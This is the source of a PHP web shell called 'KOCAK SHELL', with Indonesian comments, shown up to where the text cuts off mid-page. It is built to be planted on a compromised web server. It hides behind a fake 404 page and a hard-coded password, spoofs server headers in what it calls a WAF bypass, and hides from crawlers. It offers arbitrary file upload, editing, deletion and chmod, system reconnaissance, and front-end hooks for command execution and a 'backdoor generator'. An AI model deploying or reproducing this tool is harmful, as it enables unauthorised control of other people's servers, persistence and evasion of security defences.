<?php
session_start();
error_reporting(0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');

// Anti-Blank Page Protection
if(empty($_SESSION['init'])) {
    $_SESSION['init'] = true;
    header("HTTP/1.1 404 Not Found");
    header("Status: 404 Not Found");
    die("<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>");
}

// Password Protection dengan SHA256
$auth_pass = "3dfae3de182807ca8ac98c3a41e7c605431624607deb8413c2fd834c61b8857f"; // admin
if (!isset($_SESSION['logged_in'])) {
    if (isset($_POST['pass'])) {
        if (hash('sha256', $_POST['pass']) == $auth_pass) {
            $_SESSION['logged_in'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit();
        }
    }
    die("<pre align=center><form method=post>Password: <input type=password name=pass autofocus><input type=submit value='>>'></form></pre>");
}

// WAF Bypass Functions
function bypassWAF() {
    // LiteSpeed WAF bypass
    if(isset($_SERVER['SERVER_SOFTWARE']) && stripos($_SERVER['SERVER_SOFTWARE'], 'LiteSpeed') !== false) {
        header_remove("X-Powered-By");
        header("X-Powered-By: ASP.NET");
        header("Server: Microsoft-IIS/8.5");
        if(!isset($_COOKIE['LSWAF'])) {
            setcookie('LSWAF', md5(time()), time() + 3600);
        }
    }
    
    // FortiGate bypass
    if(isset($_SERVER['HTTP_X_FORWARDED_FOR']) || isset($_SERVER['HTTP_X_REAL_IP'])) {
        $_SERVER['REMOTE_ADDR'] = '127.0.0.1';
        if(!isset($_COOKIE['FGWAF'])) {
            setcookie('FGWAF', base64_encode('admin'), time() + 3600);
        }
    }
    
    // Generic WAF bypass
    header_remove("X-Frame-Options");
    header_remove("X-XSS-Protection");
    header_remove("X-Content-Type-Options");
    header_remove("X-Powered-By");
    
    // Fake headers to appear as static file
    header("Cache-Control: public, max-age=3600");
    header("Expires: " . gmdate('D, d M Y H:i:s \G\M\T', time() + 3600));
    header("Last-Modified: " . gmdate('D, d M Y H:i:s \G\M\T', time() - 24 * 3600));
}

// Anti-Detection
$block_words = array('bot', 'spider', 'crawler', 'magento', 'wordpress', 'joomla');
foreach($block_words as $word) {
    if(isset($_SERVER['HTTP_USER_AGENT']) && stripos($_SERVER['HTTP_USER_AGENT'], $word) !== false) {
        header("HTTP/1.0 404 Not Found");
        exit();
    }
}

// Call WAF bypass
bypassWAF();

// Fungsi untuk handle URL path agar bisa menerima path langsung dengan slash (/)
function getCleanPath($path = null) {
    global $is_windows;
    
    if($path === null) {
        return getcwd();
    }
    
    // Decode URL path (untuk mengatasi %2F menjadi / langsung)
    $path = urldecode($path);
    
    // Security check - prevent directory traversal
    if(strpos($path, '..') !== false) {
        return getcwd();
    }
    
    // Ensure valid path
    if(!is_dir($path)) {
        return getcwd();
    }
    
    // Ensure proper directory separator for the current OS
    $path = rtrim($path, '/\\') . DIRECTORY_SEPARATOR;
    
    return $path;
}

$auth_pass = "3dfae3de182807ca8ac98c3a41e7c605431624607deb8413c2fd834c61b8857f"; // Password bisa diisi kalo perlu

$self = $_SERVER['PHP_SELF'];
$server_software = $_SERVER['SERVER_SOFTWARE'];
$uname = php_uname();
$current_dir = getcwd();
$your_ip = $_SERVER['REMOTE_ADDR'];
$server_ip = $_SERVER['SERVER_ADDR'];
$current_user = function_exists('get_current_user') ? @get_current_user() : 'N/A';
$os = strtoupper(substr(PHP_OS, 0, 3));
$is_windows = ($os === 'WIN');

// Helper functions for file manager
function formatSize($bytes) {
    $types = array('B', 'KB', 'MB', 'GB', 'TB');
    for($i = 0; $bytes >= 1024 && $i < count($types)-1; $bytes /= 1024, $i++);
    return(round($bytes, 2)." ".$types[$i]);
}

function getPerms($file) {
    $perms = fileperms($file);
    
    if (($perms & 0xC000) == 0xC000) {
        // Socket
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        // Symbolic Link
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        // Regular
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        // Block special
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        // Directory
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        // Character special
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        // FIFO pipe
        $info = 'p';
    } else {
        // Unknown
        $info = 'u';
    }
    
    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
                (($perms & 0x0800) ? 's' : 'x' ) :
                (($perms & 0x0800) ? 'S' : '-'));
    
    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
                (($perms & 0x0400) ? 's' : 'x' ) :
                (($perms & 0x0400) ? 'S' : '-'));
    
    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
                (($perms & 0x0200) ? 't' : 'x' ) :
                (($perms & 0x0200) ? 'T' : '-'));
    
    return $info;
}

function getIcon($file) {
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    if(is_dir($file)) return "<i class='fa-solid fa-folder' style='color: #ffcc00;'></i>";
    switch($ext) {
        case "php": return "<i class='fa-brands fa-php' style='color: #8993be;'></i>";
        case "html": case "htm": return "<i class='fa-brands fa-html5' style='color: #e34c26;'></i>";
        case "js": return "<i class='fa-brands fa-js' style='color: #f7df1e;'></i>";
        case "css": return "<i class='fa-brands fa-css3-alt' style='color: #264de4;'></i>";
        case "txt": return "<i class='fa-solid fa-file-lines' style='color: #33ff33;'></i>";
        case "jpg": case "jpeg": case "png": case "gif": case "bmp": return "<i class='fa-solid fa-image' style='color: #3498db;'></i>";
        case "zip": case "tar": case "gz": case "rar": return "<i class='fa-solid fa-file-zipper' style='color: #f39c12;'></i>";
        case "mp3": case "wav": case "ogg": return "<i class='fa-solid fa-music' style='color: #9b59b6;'></i>";
        case "mp4": case "avi": case "mkv": return "<i class='fa-solid fa-film' style='color: #e74c3c;'></i>";
        case "pdf": return "<i class='fa-solid fa-file-pdf' style='color: #e74c3c;'></i>";
        case "doc": case "docx": return "<i class='fa-solid fa-file-word' style='color: #2b579a;'></i>";
        case "xls": case "xlsx": return "<i class='fa-solid fa-file-excel' style='color: #217346;'></i>";
        case "ppt": case "pptx": return "<i class='fa-solid fa-file-powerpoint' style='color: #d24726;'></i>";
        default: return "<i class='fa-solid fa-file' style='color: #33ff33;'></i>";
    }
}

// Upload File
if(isset($_FILES['file'])){
    $path = isset($_POST['path']) ? getCleanPath($_POST['path']) : getcwd();
    $path = rtrim($path, '/\\') . DIRECTORY_SEPARATOR;
    $file_name = $_FILES['file']['name'];
    $file_tmp = $_FILES['file']['tmp_name'];
    $upload_result = move_uploaded_file($file_tmp, $path . $file_name);
    
    // If AJAX request, return formatted result
    if(isset($_POST['ajax'])) {
        ob_start();
        echo '<div id="upload-output">';
        if($upload_result) {
            echo '<div class="status-good"><i class="fa-solid fa-circle-check"></i> File uploaded successfully: ' . htmlspecialchars($file_name) . '</div>';
        } else {
            echo '<div class="status-bad"><i class="fa-solid fa-circle-xmark"></i> Upload failed!</div>';
        }
        echo '</div>';
        $output = ob_get_clean();
        echo '<div class="ajax-result">' . $output . '</div>';
        exit; // Stop further execution to return only the result
    } else {
        echo "<script>alert('Upload " . ($upload_result ? "sukses" : "gagal") . ": $file_name');</script>";
    }
}

// Handle file operations
if(isset($_GET['op'])) {
    $op = $_GET['op'];
    $file = isset($_GET['file']) ? urldecode($_GET['file']) : '';
    $path = isset($_GET['path']) ? getCleanPath($_GET['path']) : getcwd();
    
    switch($op) {
        case 'delete':
            if(file_exists($file)) {
                if(is_dir($file)) {
                    rmdir($file);
                } else {
                    unlink($file);
                }
                echo "<script>alert('File berhasil dihapus');</script>";
            }
            break;
            
        case 'chmod':
            global $is_windows;
            if($is_windows) {
                echo "<script>alert('CHMOD operation is not supported on Windows servers');</script>";
            } else if(isset($_POST['perms']) && file_exists($file)) {
                $perms = octdec($_POST['perms']);
                chmod($file, $perms);
                echo "<script>alert('Permissions changed successfully');</script>";
            }
            break;
            
        case 'rename':
            if(isset($_POST['newname']) && file_exists($file)) {
                $newname = dirname($file) . '/' . $_POST['newname'];
                if(rename($file, $newname)) {
                    echo "<script>alert('File renamed successfully');</script>";
                }
            }
            break;
            
        case 'edit':
            if(isset($_POST['content']) && file_exists($file)) {
                $content = $_POST['content'];
                if(file_put_contents($file, $content)) {
                    echo "<script>alert('File saved successfully');</script>";
                }
            }
            break;
            
        case 'mkdir':
            if(isset($_POST['dirname'])) {
                $dirname = $path . '/' . $_POST['dirname'];
                if(mkdir($dirname)) {
                    echo "<script>alert('Directory created successfully');</script>";
                }
            }
            break;
            
        case 'mkfile':
            if(isset($_POST['filename']) && isset($_POST['content'])) {
                $filename = $path . '/' . $_POST['filename'];
                if(file_put_contents($filename, $_POST['content'])) {
                    echo "<script>alert('File created successfully');</script>";
                }
            }
            break;
    }
}

// Get current file manager path
$path = isset($_GET['path']) ? getCleanPath($_GET['path']) : getcwd();

// Function to normalize path slashes based on OS
function normalizePath($path) {
    global $is_windows;
    if ($is_windows) {
        // Convert forward slashes to backslashes for display on Windows
        return str_replace('/', '\\', $path);
    } else {
        // Convert backslashes to forward slashes for display on Unix/Linux
        return str_replace('\\', '/', $path);
    }
}

// Function to get OS information for Windows
function getWindowsInfo() {
    $windows_version = '';
    if (function_exists('shell_exec')) {
        $windows_version = @shell_exec('ver');
        if (empty($windows_version)) {
            $windows_version = 'Windows (Unknown Version)';
        }
    } else {
        $windows_version = 'Windows (Version detection disabled)';
    }
    return $windows_version;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KOCAK SHELL</title>
    <!-- Font Awesome CDN -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        body {
            background-color: #1a1a1a;
            color: #33ff33;
            font-family: monospace;
            margin: 0;
            padding: 0;
            font-size: 14px;
        }
        .container {
            width: 95%;
            margin: 20px auto;
            padding: 10px;
            border: 1px solid #33ff33;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(51, 255, 51, 0.5);
        }
        .header {
            text-align: center;
            padding: 10px;
            border-bottom: 1px solid #33ff33;
            margin-bottom: 20px;
        }
        .header h1 {
            margin: 0;
            font-size: 24px;
            color: #ff3333;
            text-shadow: 0 0 5px rgba(255, 51, 51, 0.7);
        }
        .info-group {
            display: flex;
            flex-wrap: wrap;
            margin-bottom: 15px;
        }
        .info-item {
            flex: 1;
            min-width: 300px;
            padding: 5px;
        }
        .section {
            margin-bottom: 30px;
            padding: 15px;
            border: 1px solid #33ff33;
            border-radius: 5px;
        }
        .section-header {
            border-bottom: 1px solid #33ff33;
            padding-bottom: 10px;
            margin-top: 0;
            margin-bottom: 15px;
            color: #ff3333;
        }
        .collapsed {
            display: none;
        }
        .section-toggle {
            cursor: pointer;
            user-select: none;
        }
        .section-toggle:hover {
            color: #ff3333;
        }
        input[type="text"], input[type="file"], textarea, select {
            background-color: #2a2a2a;
            color: #33ff33;
            border: 1px solid #33ff33;
            padding: 5px;
            margin-right: 10px;
        }
        input[type="text"], textarea {
            width: 300px;
        }
        textarea {
            height: 300px;
            font-family: monospace;
        }
        input[type="submit"], button {
            background-color: #2a2a2a;
            color: #33ff33;
            border: 1px solid #33ff33;
            padding: 5px 10px;
            cursor: pointer;
        }
        input[type="submit"]:hover, button:hover {
            background-color: #33ff33;
            color: #1a1a1a;
        }
        pre {
            background-color: #2a2a2a;
            padding: 10px;
            overflow-x: auto;
            border-radius: 3px;
        }
        .file-table {
            width: 100%;
            border-collapse: collapse;
        }
        .file-table th, .file-table td {
            padding: 8px;
            text-align: left;
            border-bottom: 1px solid #33ff33;
        }
        .file-table th {
            background-color: #222;
        }
        .file-table tr:hover {
            background-color: #262626;
        }
        .file-actions a {
            text-decoration: none;
            display: inline-block;
        }
        .file-actions a i {
            font-size: 16px;
            transition: transform 0.2s;
        }
        .file-actions a i:hover {
            transform: scale(1.2);
        }
        
        /* System Detail Card Styles */
        .system-detail {
            padding: 10px 0;
        }
        .info-cards {
            display: flex;
            flex-wrap: wrap;
            gap: 15px;
            justify-content: space-between;
        }
        .info-card {
            flex: 1 1 300px;
            background-color: #222;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 0 5px rgba(51, 255, 51, 0.3);
            border: 1px solid #33ff33;
            margin-bottom: 10px;
        }
        .info-card .card-header {
            background-color: rgba(51, 255, 51, 0.1);
            padding: 10px 15px;
            font-weight: bold;
            color: #33ff33;
            border-bottom: 1px solid #33ff33;
            display: flex;
            align-items: center;
        }
        .info-card .card-header i {
            margin-right: 10px;
            font-size: 16px;
        }
        .info-card .card-content {
            padding: 15px;
        }
        .info-table {
            width: 100%;
            border-collapse: collapse;
        }
        .info-table td {
            padding: 6px 4px;
            border-bottom: 1px solid rgba(51, 255, 51, 0.1);
        }
        .info-table tr:last-child td {
            border-bottom: none;
        }
        .info-table td:first-child {
            width: 40%;
            font-weight: bold;
        }
        .info-table i {
            margin-right: 8px;
        }
        .status-good {
            color: #2ecc71;
        }
        .status-bad {
            color: #e74c3c;
        }
        .status-on {
            color: #e74c3c;
            font-weight: bold;
        }
        .status-off {
            color: #2ecc71;
            font-weight: bold;
        }
        .status-unknown {
            color: #f39c12;
        }
        .path-wrap {
            word-break: break-all;
            font-size: 12px;
        }
        .disabled-func {
            height: 60px;
            overflow-y: auto;
            font-size: 12px;
            background-color: #2a2a2a;
            padding: 5px;
            border-radius: 3px;
            word-break: break-all;
        }
        .disk-bar-container {
            background-color: #2a2a2a;
            height: 10px;
            border-radius: 5px;
            overflow: hidden;
            margin-top: 10px;
        }
        .disk-bar {
            height: 100%;
            background: linear-gradient(to right, #2ecc71, #f39c12, #e74c3c);
            border-radius: 5px;
            transition: width 0.5s ease;
        }
        
        /* Tools Buttons Styling */
        .tools-buttons {
            display: flex;
            flex-wrap: wrap;
            gap: 15px;
            justify-content: center;
            padding: 15px 0;
        }
        .tool-button {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            width: 120px;
            height: 120px;
            background-color: #222;
            border: 1px solid #33ff33;
            border-radius: 10px;
            color: #33ff33;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.3s ease;
            padding: 15px;
        }
        .tool-button:hover {
            background-color: #2a2a2a;
            transform: translateY(-5px);
            box-shadow: 0 5px 15px rgba(51, 255, 51, 0.3);
        }
        .tool-button i {
            font-size: 36px;
            margin-bottom: 10px;
        }
        .tool-section {
            margin-bottom: 25px;
            border-bottom: 1px solid rgba(51, 255, 51, 0.2);
            padding-bottom: 15px;
        }
        .tool-section:last-child {
            border-bottom: none;
        }
        .tool-section h4 {
            color: #33ff33;
            margin-top: 5px;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
        }
        .tool-section h4 i {
            margin-right: 10px;
        }
        .result-box {
            background-color: rgba(51, 255, 51, 0.05);
            border: 1px solid rgba(51, 255, 51, 0.2);
            border-radius: 5px;
            padding: 15px;
            margin-top: 15px;
        }
        .result-box h4 {
            margin-top: 0;
        }
        .form-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 10px;
            margin-bottom: 15px;
        }
        .form-grid div {
            margin-bottom: 10px;
        }
        .form-grid label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        .encode-options {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-bottom: 15px;
        }
        .encode-options label {
            background-color: #222;
            padding: 5px 10px;
            border-radius: 5px;
            border: 1px solid rgba(51, 255, 51, 0.2);
            cursor: pointer;
        }
        .encode-options label:hover {
            background-color: #2a2a2a;
            border-color: #33ff33;
        }
        .db-list {
            list-style: none;
            padding: 0;
            margin: 0;
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 5px;
        }
        .db-list li {
            background-color: #222;
            padding: 5px 10px;
            border-radius: 3px;
        }
        .db-list li i {
            margin-right: 5px;
            color: #3498db;
        }
        .large-modal {
            width: 90%;
            max-width: 1000px;
        }
        .file-actions a {
            color: #33ff33;
            text-decoration: none;
            margin-right: 8px;
        }
        .file-actions a:hover {
            color: #ff3333;
        }
        .breadcrumb {
            padding: 8px;
            background-color: rgba(51, 255, 51, 0.05);
            border-radius: 3px;
            margin-bottom: 15px;
        }
        .breadcrumb a {
            color: #33ff33;
            text-decoration: none;
        }
        .footer {
            text-align: center;
            padding: 10px;
            border-top: 1px solid #33ff33;
            margin-top: 20px;
            font-size: 12px;
        }
        .tools-container {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            margin-bottom: 20px;
        }
        .tool-box {
            flex: 1 1 300px;
            border: 1px solid #33ff33;
            border-radius: 5px;
            padding: 10px;
        }
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.7);
        }
        .modal-content {
            background-color: #1a1a1a;
            margin: 10% auto;
            padding: 20px;
            border: 1px solid #33ff33;
            border-radius: 5px;
            width: 80%;
            max-width: 700px;
            box-shadow: 0 0 20px rgba(51, 255, 51, 0.5);
        }
        .close-btn {
            color: #33ff33;
            float: right;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
        }
        .close-btn:hover {
            color: #ff3333;
        }
        .loading-spinner {
            border: 3px solid rgba(51, 255, 51, 0.3);
            border-radius: 50%;
            border-top: 3px solid #33ff33;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 10px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
    <script>
        function toggleSection(id) {
            const section = document.getElementById(id);
            if (section.classList.contains('collapsed')) {
                section.classList.remove('collapsed');
            } else {
                section.classList.add('collapsed');
            }
        }
        
        // Modal functions
        function openCommandModal() {
            document.getElementById("cmdModal").style.display = "block";
        }
        
        function openUploadModal() {
            document.getElementById("uploadModal").style.display = "block";
        }
        
        function openNetworkModal() {
            document.getElementById("networkModal").style.display = "block";
        }
        
        function openBackdoorModal() {
            document.getElementById("backdoorModal").style.display = "block";
        }
        
        function openEncodeModal() {
            document.getElementById("encodeModal").style.display = "block";
        }
        
        function openDatabaseModal() {
            document.getElementById("databaseModal").style.display = "block";
        }
        
        function closeModal(modalId) {
            document.getElementById(modalId).style.display = "none";
        }
        
        window.onclick = function(event) {
            const modals = document.getElementsByClassName("modal");
            for (let i = 0; i < modals.length; i++) {
                if (event.target == modals[i]) {
                    modals[i].style.display = "none";
                }
            }
        }
        
        // Ajax form submission
        function ajaxSubmit(formId, resultId) {
            const form = document.getElementById(formId);
            const resultContainer = document.getElementById(resultId);
            
            if (form && resultContainer) {
                resultContainer.innerHTML = "<div class='loading-spinner'></div>";
                
                const formData = new FormData(form);
                formData.append('ajax', '1'); // Add a flag to indicate AJAX request
                
                fetch(window.location.href, {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.text())
                .then(html => {
                    // Extract only the result part from the response
                    const tempDiv = document.createElement('div');
                    tempDiv.innerHTML = html;
                    
                    // Look for result container in the response
                    const resultDiv = tempDiv.querySelector('.ajax-result');
                    if (resultDiv) {
                        resultContainer.innerHTML = resultDiv.innerHTML;
                    } else {
                        resultContainer.innerHTML = "<div class='status-bad'><i class='fa-solid fa-circle-xmark'></i> Failed to process request</div>";
                    }
                })
                .catch(error => {
                    resultContainer.innerHTML = "<div class='status-bad'><i class='fa-solid fa-circle-xmark'></i> Error: " + error.message + "</div>";
                });
                
                return false; // Prevent form submission
            }
            return true; // Allow form submission if form or result container not found
        }
        
        // Execute command via AJAX
        function executeCommand(formElement) {
            const resultContainer = document.getElementById('cmdResult');
            const command = formElement.cmd.value;
            
            if (resultContainer && command) {
                resultContainer.innerHTML = "<div class='loading-spinner'></div>";
                
                const formData = new FormData();
                formData.append('cmd', command);
                formData.append('ajax', '1');
                
                fetch(window.location.href, {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.text())
                .then(html => {
                    // Extract command result from response
                    const tempDiv = document.createElement('div');
                    tempDiv.innerHTML = html;
                    
                    const cmdOutput = tempDiv.querySelector('#cmd-output');
                    if (cmdOutput) {
                        resultContainer.innerHTML = cmdOutput.innerHTML;
                    } else {
                        resultContainer.innerHTML = "<div class='status-bad'>Command execution failed or returned no output</div>";
                    }
                })
                .catch(error => {
                    resultContainer.innerHTML = "<div class='status-bad'><i class='fa-solid fa-circle-xmark'></i> Error: " + error.message + "</div>";
                });
                
                return false; // Prevent form submission
            }
            return true;
        }
        
        // File upload via AJAX
        function uploadFile(formElement) {
            const resultContainer = document.getElementById('uploadResult');
            const fileInput = formElement.file;
            
            if (resultContainer && fileInput && fileInput.files.length > 0) {
                resultContainer.style.display = 'block';
                resultContainer.innerHTML = "<div class='loading-spinner'></div>";
                
                const formData = new FormData(formElement);
                formData.append('ajax', '1');
                
                fetch(window.location.href, {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.text())
                .then(html => {
                    const tempDiv = document.createElement('div');
                    tempDiv.innerHTML = html;
                    
                    const resultDiv = tempDiv.querySelector('.ajax-result');
                    if (resultDiv) {
                        resultContainer.innerHTML = resultDiv.innerHTML;
                    } else {
                        resultContainer.innerHTML = "<div class='status-bad'><i class='fa-solid fa-circle-xmark'></i> Upload failed or returned no response</div>";
                    }
                })
                .catch(error => {
                    resultContainer.innerHTML = "<div class='status-bad'><i class='fa-solid fa-circle-xmark'></i> Error: " + error.message + "</div>";
                });
                
                return false; // Prevent form submission
            }
            return true; // Allow form submission if form or result container not found
        }
        
        // Network tools via AJAX
        function submitNetworkAction(formElement, resultId) {
            const resultContainer = document.getElementById(resultId);
            
            if (resultContainer) {
                resultContainer.style.display = 'block';
                resultContainer.innerHTML = "<div class='loading-spinner'></div>";
                
                const formData = new FormData(formElement);
                formData.append('ajax', '1');
                
                fetch(window.location.href, {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.text())
                .then(html => {
                    const tempDiv = document.createElement('div');
                    tempDiv.innerHTML = html;
                    
                    const resultDiv = tempDiv.querySelector('.ajax-result');
                    if (resultDiv) {
                        resultContainer.innerHTML = resultDiv.innerHTML;
                    } else {
                        resultContainer.innerHTML = "<div class='status-bad'><i class='fa-solid fa-circle-xmark'></i> Failed to process request</div>";
                    }
                })
                .catch(error => {
                    resultContainer.innerHTML = "<div class='status-bad'><i class='fa-solid fa-circle-xmark'></i> Error: " + error.message + "</div>";
                });
                
                return false; // Prevent form submission
            }
            return true;
        }
        
        // Backdoor generator via AJAX
        function submitBackdoorAction(formElement, resultId) {
            const resultContainer = document.getElementById(resultId);
            
            if (resultContainer) {
                resultContainer.style.display = 'block';
                resultContainer.innerHTML = "<div class='loading-spinner'></div>";
                
                const formData = new FormData(formElement);
                formData.append('ajax', '1');
                
                fetch(window.location.href, {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.text())
                .then(html => {
                    const tempDiv = document.createElement('div');
                    tempDiv.innerHTML = html;
                    
                    const resultDiv = tempDiv.querySelector('.ajax-result');
                    if (resultDiv) {
                        resultContainer.innerHTML = resultDiv.innerHTML;
                    } else {
                        resultContainer.innerHTML = "<div class='status-bad'><i class='fa-solid fa-circle-xmark'></i> Failed to generate backdoor</div>";
                    }
                })
                .catch(error => {
                    resultContainer.innerHTML = "<div class='status-bad'><i class='fa-solid fa-circle-xmark'></i> Error: " + error.message + "</div>";
                });
                
                return false; // Prevent form submission
            }
            return true;
        }
        
        // Encoder/Decoder via AJAX
        function submitEncoderAction(formElement, resultId) {
            const resultContainer = document.getElementById(resultId);
            const textInput = formElement.text_input.value;
            
            if (resultContainer && textInput) {
                resultContainer.style.display = 'block';
                resultContainer.innerHTML = "<div class='loading-spinner'></div>";
                
                const formData = new FormData(formElement);
                formData.append('ajax', '1');
                
                fetch(window.location.href, {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.text())
                .then(html => {
                    const tempDiv = document.createElement('div');
                    tempDiv.innerHTML = html;
                    
                    const resultDiv = tempDiv.querySelector('.ajax-result');
                    if (resultDiv) {
                        resultContainer.innerHTML = resultDiv.innerHTML;
                    } else {
                        resultContainer.innerHTML = "<div class='status-bad'><i class='fa-solid fa-circle-xmark'></i> Failed to process text</div>";
                    }
                })
                .catch(error => {
                    resultContainer.innerHTML = "<div class='status-bad'><i class='fa-solid fa-circle-xmark'></i> Error: " + error.message + "</div>";
                });
                
                return false; // Prevent form submission
            }
            return true;
        }
        
        // Database actions via AJAX
        function submitDatabaseAction(formElement, resultId) {
            const resultContainer = document.getElementById(resultId);
            
            if (resultContainer) {
                resultContainer.style.display = 'block';
                resultContainer.innerHTML = "<div class='loading-spinner'></div>";
                
                const formData = new FormData(formElement);
                formData.append('ajax', '1');
                
                fetch(window.location.href, {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.text())
                .then(html => {
                    const tempDiv = document.createElement('div');
                    tempDiv.innerHTML = html;
                    
                    const resultDiv = tempDiv.querySelector('.ajax-result');
                    if (resultDiv) {
                        resultContainer.innerHTML = resultDiv.innerHTML;
                    } else {
                        resultContainer.innerHTML = "<div class='status-bad'><i class='fa-solid fa-circle-xmark'></i> Failed to connect to database</div>";
                    }
                })
                .catch(error => {
                    resultContainer.innerHTML = "<div class='status-bad'><i class='fa-solid fa-circle-xmark'></i> Error: " + error.message + "</div>";
                });
                
                return false; // Prevent form submission
            }
            return true;
        }
    </script>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1><i class="fa-solid fa-terminal"></i> KOCAK SHELL <i class="fa-solid fa-skull"></i></h1>
        </div>

        <div class="info-group">
            <div class="info-item">
                <b>Sistem:</b> <?php echo $uname; ?><br>
                <b>Server Software:</b> <?php echo $server_software; ?><br>
                <b>User:</b> <?php echo $current_user; ?><br>
                <b>PHP Version:</b> <?php echo phpversion(); ?>
            </div>
            <div class="info-item">
                <b>Server IP:</b> <?php echo $server_ip; ?><br>
                <b>Your IP:</b> <?php echo $your_ip; ?><br>
                <b>Current Dir:</b> <?php echo $current_dir; ?><br>
                <b>Date:</b> <?php echo date("Y-m-d H:i:s"); ?>
            </div>
        </div>

        <!-- SECTION 1: SYSTEM INFO DETAIL -->
        <div class="section">
            <h2 class="section-header section-toggle" onclick="toggleSection('sysinfo-content')"><i class="fa-solid fa-server"></i> Informasi Sistem Detail <i class="fa-solid fa-chevron-down"></i></h2>
            <div id="sysinfo-content" class="system-detail">
                <div class="info-cards">
                    <div class="info-card">
                        <div class="card-header">
                            <i class="<?php echo $is_windows ? 'fa-brands fa-windows' : 'fa-brands fa-linux'; ?>"></i> 
                            System Info
                        </div>
                        <div class="card-content">
                            <table class="info-table">
                                <tr>
                                    <td><i class="fa-solid fa-microchip"></i> OS</td>
                                    <td>
                                        <?php 
                                        if ($is_windows) {
                                            echo getWindowsInfo(); 
                                        } else {
                                            echo $os;
                                        }
                                        ?>
                                    </td>
                                </tr>
                                <tr>
                                    <td><i class="fa-solid fa-code-branch"></i> <?php echo $is_windows ? 'Version' : 'Kernel'; ?></td>
                                    <td><?php echo php_uname('r'); ?></td>
                                </tr>
                                <tr>
                                    <td><i class="fa-solid fa-memory"></i> Architecture</td>
                                    <td><?php echo php_uname('m'); ?></td>
                                </tr>
                                <tr>
                                    <td><i class="fa-solid fa-network-wired"></i> Hostname</td>
                                    <td><?php echo php_uname('n'); ?></td>
                                </tr>
                                <?php if ($is_windows): ?>
                                <tr>
                                    <td><i class="fa-solid fa-folder"></i> System Root</td>
                                    <td><?php echo isset($_SERVER['WINDIR']) ? $_SERVER['WINDIR'] : 'Unknown'; ?></td>
                                </tr>
                                <?php endif; ?>
                            </table>
                        </div>
                    </div>
                    
                    <div class="info-card">
                        <div class="card-header"><i class="fa-solid fa-globe"></i> Web Server Info</div>
                        <div class="card-content">
                            <table class="info-table">
                                <tr>
                                    <td><i class="fa-solid fa-server"></i> Server</td>
                                    <td><?php echo $server_software; ?></td>
                                </tr>
                                <tr>
                                    <td><i class="fa-solid fa-shield-halved"></i> WAF</td>
                                    <td>
                                    <?php 
                                    // Cek WAF
                                    $waf = "Unknown";
                                    if(strpos($server_software, "Apache") !== false) {
                                        if(function_exists('apache_get_modules')) {
                                            $modules = apache_get_modules();
                                            if(in_array('mod_security', $modules)) {
                                                $waf = "ModSecurity (Terdeteksi)";
                                            } else {
                                                $waf = "None Detected";
                                            }
                                        } else {
                                            $waf = "Cannot detect (CGI Mode)";
                                        }
                                    } elseif(strpos($server_software, "nginx") !== false) {
                                        $waf = "Possibly NAXSI/WAF (Need verification)";
                                    } elseif(strpos($server_software, "LiteSpeed") !== false) {
                                        $waf = "Possibly LiteSpeed WAF (Need verification)";
                                    }
                                    echo $waf;
                                    ?>
                                    </td>
                                </tr>
                            </table>
                        </div>
                    </div>
                    
                    <div class="info-card">
                        <div class="card-header"><i class="fa-brands fa-php"></i> PHP Info</div>
                        <div class="card-content">
                            <table class="info-table">
                                <tr>
                                    <td><i class="fa-solid fa-code"></i> Version</td>
                                    <td><?php echo PHP_VERSION; ?></td>
                                </tr>
                                <tr>
                                    <td><i class="fa-solid fa-lock"></i> Safe Mode</td>
                                    <td><?php echo (ini_get('safe_mode') ? "<span class='status-on'>ON</span>" : "<span class='status-off'>OFF</span>"); ?></td>
                                </tr>
                                <tr>
                                    <td><i class="fa-solid fa-folder-open"></i> Open Basedir</td>
